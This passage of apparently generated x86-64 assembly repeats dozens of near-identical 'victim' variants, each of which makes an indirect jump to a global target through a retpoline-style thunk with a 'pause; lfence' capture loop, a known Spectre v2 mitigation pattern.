	callq	.Lgg_retpol_thunk_000104
	jmp	.Lgg_retpol_after_000104
.Lgg_retpol_thunk_000104:
	callq	.Lgg_retpol_setup_000104
.Lgg_retpol_cap_000104:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000104
.Lgg_retpol_setup_000104:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000104:
	jmp	.Lvictim_win0_continue
## Variant 105
.Lvictim_win0_var105:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000105
	jmp	.Lgg_retpol_after_000105
.Lgg_retpol_thunk_000105:
	callq	.Lgg_retpol_setup_000105
.Lgg_retpol_cap_000105:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000105
.Lgg_retpol_setup_000105:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000105:
	jmp	.Lvictim_win0_continue
## Variant 106
.Lvictim_win0_var106:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000106
	jmp	.Lgg_retpol_after_000106
.Lgg_retpol_thunk_000106:
	callq	.Lgg_retpol_setup_000106
.Lgg_retpol_cap_000106:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000106
.Lgg_retpol_setup_000106:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000106:
	jmp	.Lvictim_win0_continue
## Variant 107
.Lvictim_win0_var107:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000107
	jmp	.Lgg_retpol_after_000107
.Lgg_retpol_thunk_000107:
	callq	.Lgg_retpol_setup_000107
.Lgg_retpol_cap_000107:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000107
.Lgg_retpol_setup_000107:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000107:
	jmp	.Lvictim_win0_continue
## Variant 108
.Lvictim_win0_var108:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000108
	jmp	.Lgg_retpol_after_000108
.Lgg_retpol_thunk_000108:
	callq	.Lgg_retpol_setup_000108
.Lgg_retpol_cap_000108:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000108
.Lgg_retpol_setup_000108:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000108:
	jmp	.Lvictim_win0_continue
## Variant 109
.Lvictim_win0_var109:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000109
	jmp	.Lgg_retpol_after_000109
.Lgg_retpol_thunk_000109:
	callq	.Lgg_retpol_setup_000109
.Lgg_retpol_cap_000109:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000109
.Lgg_retpol_setup_000109:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000109:
	jmp	.Lvictim_win0_continue
## Variant 110
.Lvictim_win0_var110:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000110
	jmp	.Lgg_retpol_after_000110
.Lgg_retpol_thunk_000110:
	callq	.Lgg_retpol_setup_000110
.Lgg_retpol_cap_000110:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000110
.Lgg_retpol_setup_000110:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000110:
	jmp	.Lvictim_win0_continue
## Variant 111
.Lvictim_win0_var111:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000111
	jmp	.Lgg_retpol_after_000111
.Lgg_retpol_thunk_000111:
	callq	.Lgg_retpol_setup_000111
.Lgg_retpol_cap_000111:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000111
.Lgg_retpol_setup_000111:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000111:
	jmp	.Lvictim_win0_continue
## Variant 112
.Lvictim_win0_var112:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000112
	jmp	.Lgg_retpol_after_000112
.Lgg_retpol_thunk_000112:
	callq	.Lgg_retpol_setup_000112
.Lgg_retpol_cap_000112:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000112
.Lgg_retpol_setup_000112:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000112:
	jmp	.Lvictim_win0_continue
## Variant 113
.Lvictim_win0_var113:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000113
	jmp	.Lgg_retpol_after_000113
.Lgg_retpol_thunk_000113:
	callq	.Lgg_retpol_setup_000113
.Lgg_retpol_cap_000113:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000113
.Lgg_retpol_setup_000113:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000113:
	jmp	.Lvictim_win0_continue
## Variant 114
.Lvictim_win0_var114:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000114
	jmp	.Lgg_retpol_after_000114
.Lgg_retpol_thunk_000114:
	callq	.Lgg_retpol_setup_000114
.Lgg_retpol_cap_000114:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000114
.Lgg_retpol_setup_000114:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000114:
	jmp	.Lvictim_win0_continue
## Variant 115
.Lvictim_win0_var115:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000115
	jmp	.Lgg_retpol_after_000115
.Lgg_retpol_thunk_000115:
	callq	.Lgg_retpol_setup_000115
.Lgg_retpol_cap_000115:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000115
.Lgg_retpol_setup_000115:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000115:
	jmp	.Lvictim_win0_continue
## Variant 116
.Lvictim_win0_var116:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000116
	jmp	.Lgg_retpol_after_000116
.Lgg_retpol_thunk_000116:
	callq	.Lgg_retpol_setup_000116
.Lgg_retpol_cap_000116:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000116
.Lgg_retpol_setup_000116:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000116:
	jmp	.Lvictim_win0_continue
## Variant 117
.Lvictim_win0_var117:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000117
	jmp	.Lgg_retpol_after_000117
.Lgg_retpol_thunk_000117:
	callq	.Lgg_retpol_setup_000117
.Lgg_retpol_cap_000117:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000117
.Lgg_retpol_setup_000117:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000117:
	jmp	.Lvictim_win0_continue
## Variant 118
.Lvictim_win0_var118:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000118
	jmp	.Lgg_retpol_after_000118
.Lgg_retpol_thunk_000118:
	callq	.Lgg_retpol_setup_000118
.Lgg_retpol_cap_000118:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000118
.Lgg_retpol_setup_000118:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000118:
	jmp	.Lvictim_win0_continue
## Variant 119
.Lvictim_win0_var119:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000119
	jmp	.Lgg_retpol_after_000119
.Lgg_retpol_thunk_000119:
	callq	.Lgg_retpol_setup_000119
.Lgg_retpol_cap_000119:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000119
.Lgg_retpol_setup_000119:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000119:
	jmp	.Lvictim_win0_continue
## Variant 120
.Lvictim_win0_var120:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000120
	jmp	.Lgg_retpol_after_000120
.Lgg_retpol_thunk_000120:
	callq	.Lgg_retpol_setup_000120
.Lgg_retpol_cap_000120:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000120
.Lgg_retpol_setup_000120:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000120:
	jmp	.Lvictim_win0_continue
## Variant 121
.Lvictim_win0_var121:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000121
	jmp	.Lgg_retpol_after_000121
.Lgg_retpol_thunk_000121:
	callq	.Lgg_retpol_setup_000121
.Lgg_retpol_cap_000121:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000121
.Lgg_retpol_setup_000121:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000121:
	jmp	.Lvictim_win0_continue
## Variant 122
.Lvictim_win0_var122:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000122
	jmp	.Lgg_retpol_after_000122
.Lgg_retpol_thunk_000122:
	callq	.Lgg_retpol_setup_000122
.Lgg_retpol_cap_000122:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000122
.Lgg_retpol_setup_000122:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000122:
	jmp	.Lvictim_win0_continue
## Variant 123
.Lvictim_win0_var123:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000123
	jmp	.Lgg_retpol_after_000123
.Lgg_retpol_thunk_000123:
	callq	.Lgg_retpol_setup_000123
.Lgg_retpol_cap_000123:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000123
.Lgg_retpol_setup_000123:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000123:
	jmp	.Lvictim_win0_continue
## Variant 124
.Lvictim_win0_var124:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000124
	jmp	.Lgg_retpol_after_000124
.Lgg_retpol_thunk_000124:
	callq	.Lgg_retpol_setup_000124
.Lgg_retpol_cap_000124:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000124
.Lgg_retpol_setup_000124:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000124:
	jmp	.Lvictim_win0_continue
## Variant 125
.Lvictim_win0_var125:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000125
	jmp	.Lgg_retpol_after_000125
.Lgg_retpol_thunk_000125:
	callq	.Lgg_retpol_setup_000125
.Lgg_retpol_cap_000125:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000125
.Lgg_retpol_setup_000125:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000125:
	jmp	.Lvictim_win0_continue
## Variant 126
.Lvictim_win0_var126:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000126
	jmp	.Lgg_retpol_after_000126
.Lgg_retpol_thunk_000126:
	callq	.Lgg_retpol_setup_000126
.Lgg_retpol_cap_000126:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000126
.Lgg_retpol_setup_000126:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000126:
	jmp	.Lvictim_win0_continue
## Variant 127
.Lvictim_win0_var127:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000127
	jmp	.Lgg_retpol_after_000127
.Lgg_retpol_thunk_000127:
	callq	.Lgg_retpol_setup_000127
.Lgg_retpol_cap_000127:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000127
.Lgg_retpol_setup_000127:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000127:
	jmp	.Lvictim_win0_continue
## Variant 128
.Lvictim_win0_var128:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000128
	jmp	.Lgg_retpol_after_000128
.Lgg_retpol_thunk_000128:
	callq	.Lgg_retpol_setup_000128
.Lgg_retpol_cap_000128:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000128
.Lgg_retpol_setup_000128:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000128:
	jmp	.Lvictim_win0_continue
## Variant 129
.Lvictim_win0_var129:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000129
	jmp	.Lgg_retpol_after_000129
.Lgg_retpol_thunk_000129:
	callq	.Lgg_retpol_setup_000129
.Lgg_retpol_cap_000129:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000129
.Lgg_retpol_setup_000129:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000129:
	jmp	.Lvictim_win0_continue
## Variant 130
.Lvictim_win0_var130:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000130
	jmp	.Lgg_retpol_after_000130
.Lgg_retpol_thunk_000130:
	callq	.Lgg_retpol_setup_000130
.Lgg_retpol_cap_000130:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000130
.Lgg_retpol_setup_000130:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000130:
	jmp	.Lvictim_win0_continue
## Variant 131
.Lvictim_win0_var131:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000131
	jmp	.Lgg_retpol_after_000131
.Lgg_retpol_thunk_000131:
	callq	.Lgg_retpol_setup_000131
.Lgg_retpol_cap_000131:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000131
.Lgg_retpol_setup_000131:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000131:
	jmp	.Lvictim_win0_continue
## Variant 132
.Lvictim_win0_var132:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000132
	jmp	.Lgg_retpol_after_000132
.Lgg_retpol_thunk_000132:
	callq	.Lgg_retpol_setup_000132
.Lgg_retpol_cap_000132:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000132
.Lgg_retpol_setup_000132:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000132:
	jmp	.Lvictim_win0_continue
## Variant 133
.Lvictim_win0_var133:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000133
	jmp	.Lgg_retpol_after_000133
.Lgg_retpol_thunk_000133:
	callq	.Lgg_retpol_setup_000133
.Lgg_retpol_cap_000133:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000133
.Lgg_retpol_setup_000133:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000133:
	jmp	.Lvictim_win0_continue
## Variant 134
.Lvictim_win0_var134:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000134
	jmp	.Lgg_retpol_after_000134
.Lgg_retpol_thunk_000134:
	callq	.Lgg_retpol_setup_000134
.Lgg_retpol_cap_000134:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000134
.Lgg_retpol_setup_000134:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000134:
	jmp	.Lvictim_win0_continue
## Variant 135
.Lvictim_win0_var135:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000135
	jmp	.Lgg_retpol_after_000135
.Lgg_retpol_thunk_000135:
	callq	.Lgg_retpol_setup_000135
.Lgg_retpol_cap_000135:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000135
.Lgg_retpol_setup_000135:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000135:
	jmp	.Lvictim_win0_continue
## Variant 136
.Lvictim_win0_var136:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000136
	jmp	.Lgg_retpol_after_000136
.Lgg_retpol_thunk_000136:
	callq	.Lgg_retpol_setup_000136
.Lgg_retpol_cap_000136:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000136
.Lgg_retpol_setup_000136:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000136:
	jmp	.Lvictim_win0_continue
## Variant 137
.Lvictim_win0_var137:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000137
	jmp	.Lgg_retpol_after_000137
.Lgg_retpol_thunk_000137:
	callq	.Lgg_retpol_setup_000137
.Lgg_retpol_cap_000137:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000137
.Lgg_retpol_setup_000137:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000137:
	jmp	.Lvictim_win0_continue
## Variant 138
.Lvictim_win0_var138:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000138
	jmp	.Lgg_retpol_after_000138
.Lgg_retpol_thunk_000138:
	callq	.Lgg_retpol_setup_000138
.Lgg_retpol_cap_000138:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000138
.Lgg_retpol_setup_000138:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000138:
	jmp	.Lvictim_win0_continue
## Variant 139
.Lvictim_win0_var139:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000139
	jmp	.Lgg_retpol_after_000139
.Lgg_retpol_thunk_000139:
	callq	.Lgg_retpol_setup_000139
.Lgg_retpol_cap_000139:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000139
.Lgg_retpol_setup_000139:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000139:
	jmp	.Lvictim_win0_continue
## Variant 140
.Lvictim_win0_var140:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000140
	jmp	.Lgg_retpol_after_000140
.Lgg_retpol_thunk_000140:
	callq	.Lgg_retpol_setup_000140
.Lgg_retpol_cap_000140:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000140
.Lgg_retpol_setup_000140:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000140:
	jmp	.Lvictim_win0_continue
## Variant 141
.Lvictim_win0_var141:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000141
	jmp	.Lgg_retpol_after_000141
.Lgg_retpol_thunk_000141:
	callq	.Lgg_retpol_setup_000141
.Lgg_retpol_cap_000141:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000141
.Lgg_retpol_setup_000141:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000141:
	jmp	.Lvictim_win0_continue
## Variant 142
.Lvictim_win0_var142:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000142
	jmp	.Lgg_retpol_after_000142
.Lgg_retpol_thunk_000142:
	callq	.Lgg_retpol_setup_000142
.Lgg_retpol_cap_000142:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000142
.Lgg_retpol_setup_000142:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000142:
	jmp	.Lvictim_win0_continue
## Variant 143
.Lvictim_win0_var143:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000143
	jmp	.Lgg_retpol_after_000143
.Lgg_retpol_thunk_000143:
	callq	.Lgg_retpol_setup_000143
.Lgg_retpol_cap_000143:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000143
.Lgg_retpol_setup_000143:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000143:
	jmp	.Lvictim_win0_continue
## Variant 144
.Lvictim_win0_var144:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000144
	jmp	.Lgg_retpol_after_000144
.Lgg_retpol_thunk_000144:
	callq	.Lgg_retpol_setup_000144
.Lgg_retpol_cap_000144:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000144
.Lgg_retpol_setup_000144:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000144:
	jmp	.Lvictim_win0_continue
## Variant 145
.Lvictim_win0_var145:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000145
	jmp	.Lgg_retpol_after_000145
.Lgg_retpol_thunk_000145:
	callq	.Lgg_retpol_setup_000145
.Lgg_retpol_cap_000145:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000145
.Lgg_retpol_setup_000145:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000145:
	jmp	.Lvictim_win0_continue
## Variant 146
.Lvictim_win0_var146:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000146
	jmp	.Lgg_retpol_after_000146
.Lgg_retpol_thunk_000146:
	callq	.Lgg_retpol_setup_000146
.Lgg_retpol_cap_000146:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000146
.Lgg_retpol_setup_000146:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000146:
	jmp	.Lvictim_win0_continue
## Variant 147
.Lvictim_win0_var147:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000147
	jmp	.Lgg_retpol_after_000147
.Lgg_retpol_thunk_000147:
	callq	.Lgg_retpol_setup_000147
.Lgg_retpol_cap_000147:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000147
.Lgg_retpol_setup_000147:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000147:
	jmp	.Lvictim_win0_continue
## Variant 148
.Lvictim_win0_var148:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000148
	jmp	.Lgg_retpol_after_000148
.Lgg_retpol_thunk_000148:
	callq	.Lgg_retpol_setup_000148
.Lgg_retpol_cap_000148:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000148
.Lgg_retpol_setup_000148:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000148:
	jmp	.Lvictim_win0_continue
## Variant 149
.Lvictim_win0_var149:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000149
	jmp	.Lgg_retpol_after_000149
.Lgg_retpol_thunk_000149:
	callq	.Lgg_retpol_setup_000149
.Lgg_retpol_cap_000149:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000149
.Lgg_retpol_setup_000149:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000149:
	jmp	.Lvictim_win0_continue
## Variant 150
.Lvictim_win0_var150:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000150
	jmp	.Lgg_retpol_after_000150
.Lgg_retpol_thunk_000150:
	callq	.Lgg_retpol_setup_000150
.Lgg_retpol_cap_000150:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000150
.Lgg_retpol_setup_000150:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000150:
	jmp	.Lvictim_win0_continue
## Variant 151
.Lvictim_win0_var151:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000151
	jmp	.Lgg_retpol_after_000151
.Lgg_retpol_thunk_000151:
	callq	.Lgg_retpol_setup_000151
.Lgg_retpol_cap_000151:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000151
.Lgg_retpol_setup_000151:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000151:
	jmp	.Lvictim_win0_continue
## Variant 152
.Lvictim_win0_var152:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000152
	jmp	.Lgg_retpol_after_000152
.Lgg_retpol_thunk_000152:
	callq	.Lgg_retpol_setup_000152
.Lgg_retpol_cap_000152:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000152
.Lgg_retpol_setup_000152:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000152:
	jmp	.Lvictim_win0_continue
## Variant 153
.Lvictim_win0_var153:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000153
	jmp	.Lgg_retpol_after_000153
.Lgg_retpol_thunk_000153:
	callq	.Lgg_retpol_setup_000153
.Lgg_retpol_cap_000153:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000153
.Lgg_retpol_setup_000153:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000153:
	jmp	.Lvictim_win0_continue
## Variant 154
.Lvictim_win0_var154:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000154
	jmp	.Lgg_retpol_after_000154
.Lgg_retpol_thunk_000154:
	callq	.Lgg_retpol_setup_000154
.Lgg_retpol_cap_000154:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000154
.Lgg_retpol_setup_000154:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000154:
	jmp	.Lvictim_win0_continue
## Variant 155
.Lvictim_win0_var155:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000155
	jmp	.Lgg_retpol_after_000155
.Lgg_retpol_thunk_000155:
	callq	.Lgg_retpol_setup_000155
.Lgg_retpol_cap_000155:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000155
.Lgg_retpol_setup_000155:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000155:
	jmp	.Lvictim_win0_continue
## Variant 156
.Lvictim_win0_var156:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000156
	jmp	.Lgg_retpol_after_000156
.Lgg_retpol_thunk_000156:
